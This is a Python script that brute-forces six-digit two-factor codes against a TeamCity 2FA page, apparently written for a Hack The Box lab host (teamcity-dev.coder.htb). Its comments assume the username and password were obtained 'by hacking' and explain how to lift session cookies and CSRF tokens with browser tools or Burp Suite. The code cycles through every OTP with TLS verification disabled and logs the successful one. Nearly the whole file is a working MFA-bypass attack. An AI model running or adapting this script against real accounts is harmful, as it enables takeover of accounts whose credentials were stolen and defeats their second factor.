# BruteForce6DigitOTP.py
# this is painfully slow...

import requests
import warnings
import time
import logging
from itertools import product
from concurrent.futures import ThreadPoolExecutor

# the user name and password values below are captured by other means (i.e. hacking). 
# the TCSESSIONID and Tc-csrf-token are obtained by logging into the webiste with the user name and password, then right click on the 2fa webpage, click on Inspect(Q). The the values can be found under 'cookies' and 'debugger'.

username = ""
password = ""
target_url = "https://xxx.xxx.xxx/2fa.html"  # the url for the 2fa page
initial_tc_session_id = ""
initial_tc_csrf_token = ""

found_otp = None
attempts = 0
is_otp_found = False

# Suppress the warning about disabling certificate verification
warnings.simplefilter("ignore", category=requests.urllib3.exceptions.InsecureRequestWarning)

# Set up logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    handlers=[
        logging.FileHandler("BruteOTPLog.txt"),
        logging.StreamHandler()
    ]
)

# Log initial TCSESSIONID and tc-csrf-token values
logging.info(f"Initial TCSESSIONID: {initial_tc_session_id}")
logging.info(f"Initial tc-csrf-token: {initial_tc_csrf_token}")

# Brute force the OTP using multithreading
def attempt_login(otp_str):
    global found_otp, attempts, is_otp_found, tc_session_id, tc_csrf_token

    data = {
        "username": username,
        "password": password,
        "otp": otp_str
    }
# the below value can be obtained by using Burp Suite when the 2fa page is opening.
    
    headers = {
        "Host": "teamcity-dev.coder.htb",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://xxx.xxx.xxx/2fa.html",
        "X-Requested-With": "XMLHttpRequest",
        "X-Teamcity-Client": "Web UI",
        "X-Tc-Csrf-Token": tc_csrf_token,
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://teamcity-dev.coder.htb",
        "Dnt": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Cookie": f"TCSESSIONID={tc_session_id}; __test=1"
    }
    response = requests.post(target_url, data=data, headers=headers, verify=False)

    attempts += 1
    logging.info(f"Attempted OTP: {otp_str}")

    if response.status_code == 302:
        found_otp = otp_str
        is_otp_found = True
        logging.info(f"Successful login with OTP: {otp_str}")
        return otp_str

    return None

start_time = time.time()

# Initialize TCSESSIONID and tc-csrf-token with the initial values
tc_session_id = initial_tc_session_id
tc_csrf_token = initial_tc_csrf_token

with ThreadPoolExecutor() as executor:
    # Generate all possible 6-digit OTP combinations
    otp_combinations = product(range(10), repeat=6)

    # Submit login attempts for each OTP combination
    for otp_tuple in otp_combinations:
        if is_otp_found:
            break

        otp_str = "".join(map(str, otp_tuple))

        # Check if TCSESSIONID or tc-csrf-token has changed
        if tc_session_id != initial_tc_session_id or tc_csrf_token != initial_tc_csrf_token:
            logging.info("TCSESSIONID or tc-csrf-token has changed.")
            logging.info(f"Updated TCSESSIONID: {tc_session_id}")
            logging.info(f"Updated tc-csrf-token: {tc_csrf_token}")
            break

        result = attempt_login(otp_str)
        if result:
            found_otp = result
            is_otp_found = True
            break

end_time = time.time()
elapsed_time = end_time - start_time

if found_otp:
    logging.info(f"Last successful OTP: {found_otp}")
else:
    logging.info("No valid OTP found.")

logging.info(f"Total OTP combinations attempted: {attempts}")
logging.info(f"Total elapsed time: {elapsed_time:.2f} seconds")

logging.info("Brute force complete.")
